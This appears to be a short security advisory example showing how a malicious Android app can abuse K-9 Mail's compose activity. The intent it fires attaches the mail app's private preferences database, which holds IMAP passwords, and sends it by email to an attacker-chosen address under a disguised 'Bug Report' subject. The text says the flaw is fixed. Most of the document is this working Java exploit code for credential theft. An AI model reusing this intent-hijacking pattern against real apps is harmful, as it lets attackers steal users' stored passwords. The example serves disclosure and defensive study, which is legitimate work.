
This example is intended to surreptitiously share IMAP passwords of K-9 Mail
with an attacker. Please note that K-9 Mail serves only as an example,
the issue has already been fixed in the current release and was present
in many more apps

The code required to execute this attack follows:

    Intent i = new Intent();
    i.setComponent(new ComponentName("com.fsck.k9", "com.fsck.k9.activity.MessageCompose"));
    i.setAction(Intent.ACTION_SEND); i.setType("text/plain");
    Uri uri = Uri.parse("file:///data/data/com.fsck.k9/databases/preferences_storage");
    i.putExtra(Intent.EXTRA_STREAM, uri);
    i.putExtra(Intent.EXTRA_TEXT, "Hello World");
    i.putExtra(Intent.EXTRA_EMAIL, new String[]{"support@company.com"});
    i.putExtra(Intent.EXTRA_TEXT, "Dear support team,...");
    i.putExtra(Intent.EXTRA_SUBJECT, "Bug Report");

This can be reproduced by connecting to a Android device via `adb shell` and
then observing the output of `dmesg | grep avc`.
